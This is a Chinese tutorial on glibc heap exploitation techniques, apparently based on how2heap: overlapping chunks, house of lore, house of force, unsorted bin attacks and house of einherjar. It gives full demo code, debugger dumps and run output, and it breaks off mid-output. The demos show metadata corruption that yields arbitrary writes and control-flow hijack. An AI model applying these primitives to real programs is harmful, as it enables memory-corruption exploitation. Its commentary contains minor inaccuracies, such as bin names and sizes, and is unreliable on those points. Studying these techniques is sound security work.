* 分配5个chunks,并初始化

```
p1 = malloc(1000);
p2 = malloc(1000);
p3 = malloc(1000);
p4 = malloc(1000);
p5 = malloc(1000);
```

* 释放p4,`free(p4)`，因为p4和top chunk不相邻，所以，释放后，不会和top chunk合并

  p4会处于 unsorted bin中。

  ```
  unsortedbin
  all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603bd0 ◂— 0x7ffff7dd1b78
  ```

* 利用p1的溢出，修改p2的size

```
 *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE 
```

```
pwndbg> heap
0x603000 PREV_INUSE {                         // p1
  prev_size = 0, 
  size = 1009, 
  fd = 0x4141414141414141, 
  bk = 0x4141414141414141, 
  fd_nextsize = 0x4141414141414141, 
  bk_nextsize = 0x4141414141414141
}
0x6033f0 PREV_INUSE {                        // p2
  prev_size = 4702111234474983745, 
  size = 2017, 
  fd = 0x4242424242424242, 
  bk = 0x4242424242424242, 
  fd_nextsize = 0x4242424242424242, 
  bk_nextsize = 0x4242424242424242
}
0x603bd0 PREV_INUSE {                            // p4
  prev_size = 4846791580151137091, 
  size = 1009, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x4444444444444444, 
  bk_nextsize = 0x4444444444444444
}
0x603fc0 {                                        // p5
  prev_size = 1008, 
  size = 1008, 
  fd = 0x4545454545454545, 
  bk = 0x4545454545454545, 
  fd_nextsize = 0x4545454545454545, 
  bk_nextsize = 0x4545454545454545
}
0x6043b0 PREV_INUSE {
  prev_size = 4991471925827290437, 
  size = 130129, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603bd0 ◂— 0x7ffff7dd1b78
smallbins
empty
largebins
empty
```

* 释放p2,这时，glibc会认为p2下一个chunk是p4,因为p2 + size_of_p2  ------> p4，从上边的示意图可以看出。

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 1009, 
  fd = 0x4141414141414141, 
  bk = 0x4141414141414141, 
  fd_nextsize = 0x4141414141414141, 
  bk_nextsize = 0x4141414141414141
}
0x6033f0 PREV_INUSE {
  prev_size = 4702111234474983745, 
  size = 3025, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603fc0 {
  prev_size = 3024, 
  size = 1008, 
  fd = 0x4545454545454545, 
  bk = 0x4545454545454545, 
  fd_nextsize = 0x4545454545454545, 
  bk_nextsize = 0x4545454545454545
}
0x6043b0 PREV_INUSE {
  prev_size = 4991471925827290437, 
  size = 130129, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x6033f0 ◂— 0x7ffff7dd1b78
smallbins
empty
largebins
empty
```

* 申请0x2000大小的区块,p6

```
 p6 = malloc(2000);
```

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 1009, 
  fd = 0x4141414141414141, 
  bk = 0x4141414141414141, 
  fd_nextsize = 0x4141414141414141, 
  bk_nextsize = 0x4141414141414141
}
0x6033f0 PREV_INUSE {
  prev_size = 4702111234474983745, 
  size = 2017, 
  fd = 0x7ffff7dd2158 <main_arena+1592>, 
  bk = 0x7ffff7dd2158 <main_arena+1592>, 
  fd_nextsize = 0x6033f0, 
  bk_nextsize = 0x6033f0
}
0x603bd0 PREV_INUSE {
  prev_size = 4846791580151137091, 
  size = 1009, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x4444444444444444, 
  bk_nextsize = 0x4444444444444444
}
0x603fc0 {
  prev_size = 1008, 
  size = 1008, 
  fd = 0x4545454545454545, 
  bk = 0x4545454545454545, 
  fd_nextsize = 0x4545454545454545, 
  bk_nextsize = 0x4545454545454545
}
0x6043b0 PREV_INUSE {
  prev_size = 4991471925827290437, 
  size = 130129, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603bd0 ◂— 0x7ffff7dd1b78
smallbins
empty
largebins
empty
```

这时候: 

p6 ------------->      0x6033f0 ~ 0x603bd0

p3 ------------->      0x6037e0 ~ 0x603bd0

有了重叠的区域。

# house of lore

glibc需求: Ubuntu 14.04.4 - 32bit - glibc-2.23

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main(int argc, char * argv[]){
  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  intptr_t *victim = malloc(100);
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "Create a fake chunk on the stack\n");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  void *p2 = malloc(1200);

  //------------VULNERABILITY-----------
  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);

  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);
  fprintf(stderr, "p4 = malloc(100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
```

运行结果:

```
qianfa@qianfa:~/Desktop/how2heap/glibc_2.25$ ./house_of_lore

Welcome to the House of Lore
This is a revisited version that bypass also the hardening check introduced by glibc malloc
This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23

Allocating the victim chunk
Allocated the first small chunk on the heap at 0xe4e010
stack_buffer_1 at 0x7fff62eb48d0
stack_buffer_2 at 0x7fff62eb48b0
Create a fake chunk on the stack
Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
Allocated the large chunk on the heap at 0xe4e080
Freeing the chunk 0xe4e010, it will be inserted in the unsorted bin

In the unsorted bin the victim's fwd and bk pointers are nil
victim->fwd: (nil)
victim->bk: (nil)

Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
This means that the chunk 0xe4e010 will be inserted in front of the SmallBin
The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0xe4e470
The victim chunk has been sorted and its fwd and bk pointers updated
victim->fwd: 0x7fbe5a917bd8
victim->bk: 0x7fbe5a917bd8

Now emulating a vulnerability that can overwrite the victim->bk pointer
Now allocating a chunk with size equal to the first one freed
This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
p4 = malloc(100)

The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fbe5a917bd8

p4 is 0x7fff62eb48e0 and should be on the stack!
Nice jump d00d
```

malloc时，需要bypass的检查如下:

```
bck = victim->bk;
// 检查 bck->fd 是不是 victim，防止伪造
if (__glibc_unlikely(bck->fd != victim)) {
     errstr = "malloc(): smallbin double linked list corrupted";
     goto errout;
}
```

* 定义两个数组，并初始化

```
intptr_t* stack_buffer_1[4] = {0};
intptr_t* stack_buffer_2[3] = {0};
```

* 分配一个small chunk,并定义一个指针指向该chunk的头部

```
intptr_t *victim = malloc(100);
intptr_t *victim_chunk = victim-2;
```

* 在栈上伪造一个fake chunk_1,并将fake chunk_1的fd指针指向 victim_chunk,来绕过针对small bin是否被破坏的检查。

```
stack_buffer_1[0] = 0;
stack_buffer_1[1] = 0;
stack_buffer_1[2] = victim_chunk;
```

* 设置fake chunk_1的bk指针指向 stack_buffer_2，同时设置fake chunk_2的fd指针指向stack_buffer_1

```
stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
```

* 申请一个新的chunk `void *p5 = malloc(1000);`,防止释放victim时，victim和top_chunk合并。

* 释放 victim,victim将被放到fast bin中。它的bk和fd指针都是nil.

* 申请一个新的chunk ` void *p2 = malloc(1200);`

  由于1200大小的chunk在bin中找不到，所以fastbin中的chunk将被放到small bin中。现在victim将处于small bin中。并且它的fd和bk指针都有了变化，指向main_arena中<main_arena+184>。

* 现在假设有溢出可以覆盖 victim->bk指针

  ```
  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
  ```

  得到small bin链如下(注意: small bins 是先进后出的，节点的增加发生在链表头部，而删除发生在尾部）:

  ```
  head  <-fake chunk2 <- facke chunk1 <- victim chunk
  ```

  fake chunk 2 的 bk 指向了一个未定义的地址，如果能通过内存泄露等手段，拿到 HEAD 的地址并填进去，整条链就闭合了。当然这里完全没有必要这么做。

* 现在申请100大小的chunk。此时,p3就相当于victim

  ```
   void *p3 = malloc(100);            
  ```

* 在申请一个100大小的chunk，该chunk将处于栈中

  ```
  char *p4 = malloc(100);
  ```

  p4 将指向 &stack_buffer_1 + 0x10 的位置，大小为100,从而可以实现对栈的控制。

* 修改rip，即可控制跳转到方法`jackpot`中。

  ```
  memcpy((p4+40), &sc, 8);
  ```

# house_of_force

 一种通过改写 top chunk 的 size 字段来欺骗 malloc 返回任意地址的技术。我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。所以 top chunk 的大小会随着分配和回收不停地变化。

```
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main(int argc , char* argv[])
{
	fprintf(stderr, "\nWelcome to the House of Force\n\n");
	fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
	fprintf(stderr, "The top chunk is a special chunk. Is the last in memory "
		"and is the chunk that will be resized when malloc asks for more space from the os.\n");

	fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
	fprintf(stderr, "Its current value is: %s\n", bss_var);

	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
	intptr_t *p1 = malloc(256);
	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - sizeof(long)*2);

	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
	int real_size = malloc_usable_size(p1);
	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);

	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");

	//----- VULNERABILITY ----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);

	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	//------------------------

	fprintf(stderr, "\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");

	/*
	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
	 * new_top = old_top + nb
	 * nb = new_top - old_top
	 * req + 2sizeof(long) = new_top - old_top
	 * req = new_top - old_top - 2sizeof(long)
	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
	 * req = dest - old_top - 4*sizeof(long)
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
	void *new_ptr = malloc(evil_size);
	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);

	void* ctr_chunk = malloc(100);
	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
	fprintf(stderr, "Now, we can finally overwrite that value:\n");

	fprintf(stderr, "... old string: %s\n", bss_var);
	fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
	strcpy(ctr_chunk, "YEAH!!!");
	fprintf(stderr, "... new string: %s\n", bss_var);


	// some further discussion:
	//fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
	//fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "
	//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");
	//fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
	//fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
	//fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
	//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");

	//fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08x\n",p2);
	//fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);

	//fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
}
```

结果:

```
Welcome to the House of Force

The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.
The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.

In the end, we will use this to overwrite a variable at 0x602060.
Its current value is: This is a string that we want to overwrite.

Let's allocate the first chunk, taking space from the wilderness.
The chunk of 256 bytes has been allocated at 0xbd9f90.

Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.
Real size (aligned and all that jazz) of our allocated chunk is 280.

Now let's emulate a vulnerability that can overwrite the header of the Top Chunk

The top chunk starts at 0xbda110

Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.
Old size of top chunk 0x20ef1
New size of top chunk 0xffffffffffffffff

The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.
Next, we will allocate a chunk that will get us right up against the desired region (with an integer
overflow) and will then be able to allocate a chunk right over the desired region.

The value we want to write to at 0x602060, and the top chunk is at 0xbda110, so accounting for the header size,
we will malloc 0xffffffffffa27f30 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0xbda110

Now, the next chunk we overwrite will point at our target buffer.
malloc(100) => 0x602060!
Now, we can finally overwrite that value:
... old string: This is a string that we want to overwrite.
... doing strcpy overwrite with "YEAH!!!"...
... new string: YEAH!!!
```

* 找到一个需要覆盖的地址

```
char bss_var[] = "This is a string that we want to overwrite.";
```

* 申请一个堆块

```
intptr_t *p1 = malloc(256);
```

现在堆中一共有两个chunk，p1和top chunk。

* 假设p1有溢出，可以覆盖top chunk的header部分

```
intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
```

首先修改top chunk的size为-1,也就是0xffffffffffffffff，这样就可以申请任意长度的chunk，而不用调用mmap。

* 申请evil_size大小的块，计算过程如下:

```
/*
	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
	 * new_top = old_top + nb
	 * nb = new_top - old_top
	 * req + 2sizeof(long) = new_top - old_top
	 * req = new_top - old_top - 2sizeof(long)
	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
	 * req = dest - old_top - 4*sizeof(long)
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	void *new_ptr = malloc(evil_size);
```

* 再申请一个chunk,这时候ctr_chunk将指向bss_var

```
void* ctr_chunk = malloc(100);
```

# unsorted_bin_attack

为更进一步的攻击做准备，我们知道 unsorted bin 是一个双向链表，在分配时会通过 unlink 操作将 chunk 从链表中移除，所以如果能够控制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过 unlink 将 libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻击提供便利。

```
#include <stdio.h>
#include <stdlib.h>

int main(){
	fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
	fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
		   "global variable global_max_fast in libc for further fastbin attack\n\n");

	unsigned long stack_var=0;
	fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
	fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

	unsigned long *p=malloc(400);
	fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
	fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
	malloc(500);

	free(p);
	fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
		   "point to %p\n",(void*)p[1]);

	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
	fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

	//------------------------------------

	malloc(400);
	fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, target should has already been "
		   "rewrite:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
}

```

结果：

```
qianfa@qianfa:~/Desktop/how2heap/glibc_2.25$ ./unsorted_bin_attack 
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the target we want to rewrite on stack:
0x7ffe7322eb88: 0

Now, we allocate first normal chunk on the heap at: 0x25b7010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f45ea3a6b78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe7322eb78

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7ffe7322eb88: 0x7f45ea3a6b78

```

* 定义一个变量

```
unsigned long stack_var=0;
```

* 申请两个chunk

```
unsigned long *p=malloc(400);
malloc(500);
```

* 释放p

```
free(p);
```

* 假设p的bk可以被控制

```
p[1]=(unsigned long)(&stack_var-2);
```

* 再申请一个400大小的chunk

```
malloc(400);
```

unlink 的对 unsorted bin 的操作是这样的：

```
/* remove from unsorted list */
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

而: unsorted_chunks(av) 就是 `<main_arena+88>`

这时候，stack_var的内容将变为<main_arena_88>，而不再是0，从而泄露libc的值。

# unsorted_bin_into_stack

```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
  intptr_t stack_buffer[4] = {0};

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t* victim = malloc(0x100);

  fprintf(stderr, "Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
  intptr_t* p1 = malloc(0x100);

  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free(victim);

  fprintf(stderr, "Create a fake chunk on the stack");
  fprintf(stderr, "Set size for next allocation and the bk pointer to any writable address");
  stack_buffer[1] = 0x100 + 0x10;
  stack_buffer[3] = (intptr_t)stack_buffer;

  //------------VULNERABILITY-----------
  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
  fprintf(stderr, "Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
  victim[-1] = 32;
  victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
  //------------------------------------

  fprintf(stderr, "Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
  fprintf(stderr, "malloc(0x100): %p\n", malloc(0x100));
}
```

结果：

```
Allocating the victim chunk
Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
Freeing the chunk 0xaa5010, it will be inserted in the unsorted bin
Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
Now next malloc will return the region of our fake chunk: 0x7ffea916a680
malloc(0x100): 0x7ffea916a680
```

* 定义三个变量，并初始化

```
intptr_t stack_buffer[4] = {0};

intptr_t* victim = malloc(0x100);

intptr_t* p1 = malloc(0x100);
```

* free(victim)
* 在栈上伪造一个堆块

```
stack_buffer[1] = 0x100 + 0x10;
stack_buffer[3] = (intptr_t)stack_buffer;
```

* 假设有溢出，可以覆盖victim的size和fd字段

**Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem**

size字段必须和接下来请求的size(也就是0x100)不同，并且需要绕过一个检查。

```
victim[-1] = 32;
victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
```

* 申请一个0x100大小chunk，将返回（&stack_buffer[2]）

```
fprintf(stderr, "Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
fprintf(stderr, "malloc(0x100): %p\n", malloc(0x100));
```

# house_of_einherjar

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

/*
   Credit to st4g3r for publishing this technique
   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
*/

int main()
{
	fprintf(stderr, "Welcome to House of Einherjar!\n");
	fprintf(stderr, "Tested in Ubuntu 16.04 64bit.\n");
	fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	fprintf(stderr, "\nWe allocate 0x38 bytes for 'a'\n");
	a = (uint8_t*) malloc(0x38);
	fprintf(stderr, "a: %p\n", a);
    
    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, "Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

    // create a fake chunk
    fprintf(stderr, "\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
    fprintf(stderr, "However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
    fprintf(stderr, "We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
    fprintf(stderr, "(although we could do the unsafe unlink technique here in some scenarios)\n");

    size_t fake_chunk[6];

    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
    fake_chunk[2] = (size_t) fake_chunk; // fwd
    fake_chunk[3] = (size_t) fake_chunk; // bck
    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
    
    
    fprintf(stderr, "Our fake chunk at %p looks like:\n", fake_chunk);
    fprintf(stderr, "prev_size (not used): %#lx\n", fake_chunk[0]);
    fprintf(stderr, "size: %#lx\n", fake_chunk[1]);
    fprintf(stderr, "fwd: %#lx\n", fake_chunk[2]);
    fprintf(stderr, "bck: %#lx\n", fake_chunk[3]);
    fprintf(stderr, "fwd_nextsize: %#lx\n", fake_chunk[4]);
    fprintf(stderr, "bck_nextsize: %#lx\n", fake_chunk[5]);

	/* In this case it is easier if the chunk size attribute has a least significant byte with
	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
	 * the chunk includes the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);

	fprintf(stderr, "\nWe allocate 0xf8 bytes for 'b'.\n");
	fprintf(stderr, "b: %p\n", b);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

	fprintf(stderr, "\nb.size: %#lx\n", *b_size_ptr);
	fprintf(stderr, "b.size is: (0x100) | prev_inuse = 0x101\n");
	fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; 
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
    fprintf(stderr, "This is easiest if b.size is a multiple of 0x100 so you "
           "don't change the size of b, only its prev_inuse bit\n");
    fprintf(stderr, "If it had been modified, we would need a fake chunk inside "
           "b where it will try to consolidate the next chunk\n");

    // Write a fake prev_size to the end of a
    fprintf(stderr, "\nWe write a fake prev_size to the last %lu bytes of a so that "
           "it will consolidate with our fake chunk\n", sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

    //Change the fake chunk's size to reflect b's new prev_size
    fprintf(stderr, "\nModify fake chunk's size to reflect b's new prev_size\n");
    fake_chunk[1] = fake_size;

    // free b and it will consolidate with our fake chunk
    fprintf(stderr, "Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
    free(b);
    fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

    //if we allocate another chunk before we free b we will need to 
    //do two things: 
    //1) We will need to adjust the size of our fake chunk so that
    //fake_chunk + fake_chunk's size points to an area we control
    //2) we will need to write the size of our fake chunk
    //at the location we control. 
    //After doing these two things, when unlink gets called, our fake chunk will
    //pass the size(P) == prev_size(next_chunk(P)) test. 
    //otherwise we need to make sure that our fake chunk is up against the
    //wilderness

    fprintf(stderr, "\nNow we can call malloc() and it will begin in our fake chunk\n");
    d = malloc(0x200);
    fprintf(stderr, "Next malloc(0x200) is at %p\n", d);
}
```

结果：

```
Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.

We allocate 0x38 bytes for 'a'
a: 0x1147010
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38

We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7fff79af29a0 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7fff79af29a0
bck: 0x7fff79af29a0
fwd_nextsize: 0x7fff79af29a0
bck_nextsize: 0x7fff79af29a0

We allocate 0xf8 bytes for 'b'.
b: 0x1147050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
